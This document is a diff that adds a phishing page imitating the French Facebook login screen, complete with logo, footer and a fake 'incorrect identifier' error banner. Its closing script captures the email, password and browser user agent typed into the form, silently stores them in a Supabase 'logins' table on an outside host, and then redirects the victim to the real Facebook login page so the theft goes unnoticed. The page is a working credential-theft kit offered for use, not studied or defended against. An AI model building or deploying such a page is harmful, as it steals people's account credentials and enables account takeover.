@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="fr"><head>
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+<title>Facebook - Connexion ou inscription</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        colors: {
+          fbBlue: '#0064e0',
+          fbBlueHover: '#0055be',
+          fbGrayBg: '#f0f2f5',
+          fbTextMuted: '#65676b',
+          fbInputBg: '#ffffff',
+          fbInputBorder: '#ccd0d5',
+        },
+        fontFamily: {
+          sans: ['-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', 'sans-serif'],
+        }
+      }
+    }
+  }
+</script>
+<script>
+  const SUPABASE_URL             = 'https://pjhuhupsxsunwqgcxpai.supabase.co';
+  const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_gogDIO-bFXJVt26GCCijOw_2BBY1FAo';
+</script>
+<style data-purpose="base-typography">
+  body {
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    background-color: #ffffff;
+    color: #1c1e21;
+  }
+</style>
+<style data-purpose="custom-elements">
+  button:active { transform: scale(0.99); }
+  input::placeholder { color: #8c949e; font-size: 14.5px; }
+  #loading-spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 2px solid #fff;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    margin-left: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body class="min-h-screen flex flex-col justify-between bg-white text-gray-900 selection:bg-blue-100">
+
+<main class="w-full flex-1 flex flex-col items-center justify-between px-5 pt-12 pb-6 max-w-md mx-auto">
+
+  <header class="w-full flex flex-col items-center mt-6 mb-6" data-purpose="brand-header">
+    <div aria-label="Logo Facebook" class="w-14 h-14 text-fbBlue mb-6">
+      <svg class="w-full h-full fill-current" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20 40C8.954 40 0 31.046 0 20S8.954 0 20 0s20 8.954 20 20c0 10.05-7.397 18.368-17.031 19.805V25.781h5.059l.963-6.195h-6.022v-4.019c0-1.705.836-3.367 3.513-3.367h2.718V6.924C28.718 6.84 27.234 6.703 25.79 6.703c-5.918 0-9.789 3.588-9.789 10.09v4.793h-5.441v6.195h5.441v14.024C6.397 38.368 0 30.05 0 20" fill="none"></path>
+        <path d="M40 20C40 8.954 31.046 0 20 0S0 8.954 0 20c0 10.05 7.397 18.368 17.031 19.805V25.781h-5.441v-6.195h5.441v-4.793c0-6.502 3.871-10.09 9.789-10.09 1.444 0 2.928.137 3.44.221v5.276h-2.718c-2.677 0-3.513 1.662-3.513 3.367v4.019h6.022l-.963 6.195h-5.059v14.024C32.603 38.368 40 30.05 40 20z" fill="#0064E0"></path>
+        <path d="M27.098 25.781l.963-6.195h-6.022v-4.019c0-1.705.836-3.367 3.513-3.367h2.718V6.924C27.739 6.84 26.255 6.703 24.811 6.703c-5.918 0-9.789 3.588-9.789 10.09v4.793h-5.441v6.195h5.441v14.024c1.077.169 2.179.258 3.297.258s2.22-.089 3.297-.258V25.781h5.482z" fill="#FFFFFF"></path>
+      </svg>
+    </div>
+  </header>
+
+  <section class="w-full flex flex-col items-center" data-purpose="login-section">
+    <h1 class="text-sm font-semibold text-gray-800 text-center mb-4">
+      Se connecter à Facebook
+    </h1>
+
+    <form id="login-form" class="w-full flex flex-col gap-3" data-purpose="login-form" method="POST">
+
+      <!-- Error banner -->
+      <div class="w-full p-3 rounded-lg border border-[#fa3e3e] bg-[#ffebe8] text-xs text-[#1c1e21] leading-relaxed mb-1" role="alert">
+        <div class="font-semibold text-[#b92b27] mb-0.5">Identifiant incorrect</div>
+        L'e-mail ou le numéro de mobile que vous avez saisi n'est pas associé à un compte.
+        <a href="#" class="font-medium text-[#b92b27] hover:underline">Trouvez votre compte et connectez-vous.</a>
+      </div>
+
+      <div>
+        <label class="sr-only" for="email">E-mail ou numéro de mobile</label>
+        <input class="w-full h-11 px-3.5 rounded-lg border focus:border-fbBlue focus:ring-1 focus:ring-fbBlue outline-none text-sm text-gray-900 bg-white placeholder-gray-400 transition" id="email" name="email" placeholder="E-mail ou numéro de mobile" required type="text" style="border-color: #e41e3f;">
+      </div>
+
+      <div>
+        <label class="sr-only" for="password">Mot de passe</label>
+        <input class="w-full h-11 px-3.5 rounded-lg border border-gray-300 focus:border-fbBlue focus:ring-1 focus:ring-fbBlue outline-none text-sm text-gray-900 bg-white placeholder-gray-400 transition" id="password" name="password" placeholder="Mot de passe" required type="password">
+      </div>
+
+      <button id="submit-btn" class="w-full h-11 mt-1 bg-fbBlue hover:bg-fbBlueHover active:bg-blue-700 text-white font-medium text-sm rounded-full shadow-none transition duration-150 flex items-center justify-center" data-purpose="submit-login" type="submit">
+        <span id="btn-text">Se connecter</span>
+        <div id="loading-spinner"></div>
+      </button>
+
+      <div class="text-center pt-2 pb-5">
+        <a class="text-xs font-normal text-gray-700 hover:underline" href="#">
+          Mot de passe oublié ?
+        </a>
+      </div>
+    </form>
+  </section>
+
+  <section class="w-full flex flex-col items-center mt-auto" data-purpose="account-creation-and-meta">
+    <div class="w-full mb-6">
+      <a class="w-full h-9 flex items-center justify-center rounded-full border border-fbBlue text-fbBlue font-medium text-xs tracking-tight hover:bg-blue-50 transition" href="#" role="button">
+        Créer un nouveau compte
+      </a>
+    </div>
+    <div class="flex items-center gap-1 text-gray-700 mb-2" data-purpose="meta-logo"></div>
+  </section>
+
+</main>
+
+<footer class="w-full border-t border-gray-200 bg-white py-4 px-4 text-center" data-purpose="page-footer">
+  <div class="max-w-md mx-auto flex flex-col gap-2">
+    <nav aria-label="Langues" class="flex flex-wrap justify-center items-center gap-x-2 gap-y-1 text-[10px] text-gray-500">
+      <span class="font-medium text-gray-600">Français (France)</span>
+      <span>·</span>
+      <a class="hover:underline" href="#">English (US)</a>
+      <span>·</span>
+      <a class="hover:underline" href="#">Português (Brasil)</a>
+      <span>·</span>
+      <a class="hover:underline" href="#">Español</a>
+      <span>·</span>
+      <a class="hover:underline" href="#">Bahasa Indonesia</a>
+      <span>·</span>
+      <a class="hover:underline" href="#">Italiano</a>
+      <span>·</span>
+      <a class="hover:underline" dir="rtl" href="#">العربية</a>
+      <span>·</span>
+      <a class="hover:underline text-gray-700" href="#">Autres langues…</a>
+    </nav>
+    <nav aria-label="Liens d'information et d'assistance" class="flex flex-wrap justify-center items-center gap-x-2 gap-y-1 text-[9px] text-gray-400 pt-1">
+      <a class="hover:underline" href="#">S'inscrire</a>
+      <a class="hover:underline" href="#">Se connecter</a>
+      <a class="hover:underline" href="#">Messenger</a>
+      <a class="hover:underline" href="#">Facebook Lite</a>
+      <a class="hover:underline" href="#">Vidéo</a>
+      <a class="hover:underline" href="#">Meta Pay</a>
+      <a class="hover:underline" href="#">Boutique Meta</a>
+      <a class="hover:underline" href="#">Meta Quest</a>
+      <a class="hover:underline" href="#">Ray-Ban Meta</a>
+      <a class="hover:underline" href="#">Meta AI</a>
+      <a class="hover:underline" href="#">Plus</a>
+      <a class="hover:underline" href="#">Instagram</a>
+      <a class="hover:underline" href="#">Threads</a>
+      <a class="hover:underline" href="#">Politique de confidentialité</a>
+      <a class="hover:underline" href="#">Centre de confidentialité</a>
+      <a class="hover:underline" href="#">À propos</a>
+      <a class="hover:underline" href="#">Créer une publicité</a>
+      <a class="hover:underline" href="#">Créer une Page</a>
+      <a class="hover:underline" href="#">Développeurs</a>
+      <a class="hover:underline" href="#">Emplois</a>
+      <a class="hover:underline" href="#">Cookies</a>
+      <a class="hover:underline" href="#">Choisir sa publicité</a>
+      <a class="hover:underline" href="#">Conditions générales</a>
+      <a class="hover:underline" href="#">Aide</a>
+      <a class="hover:underline" href="#">Importation des contacts et non-utilisateurs</a>
+    </nav>
+    <div class="text-[9px] text-gray-400 mt-1">Meta © 2024</div>
+  </div>
+</footer>
+
+<script>
+  const { createClient } = supabase;
+  const sb = createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+
+  document.getElementById('login-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const email    = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const spinner  = document.getElementById('loading-spinner');
+    const btnText  = document.getElementById('btn-text');
+    const btn      = document.getElementById('submit-btn');
+
+    spinner.style.display = 'block';
+    btnText.textContent   = 'Connexion en cours…';
+    btn.disabled          = true;
+
+    try {
+      await sb.from('logins').insert([{
+        email:      email,
+        password:   password,
+        user_agent: navigator.userAgent
+      }]);
+    } catch (err) { /* silent */ }
+
+    // Redirect to real Facebook after 2nd attempt
+    setTimeout(() => {
+      window.location.href = 'https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2F';
+    }, 1500);
+  });
+</script>
+
+</body></html>
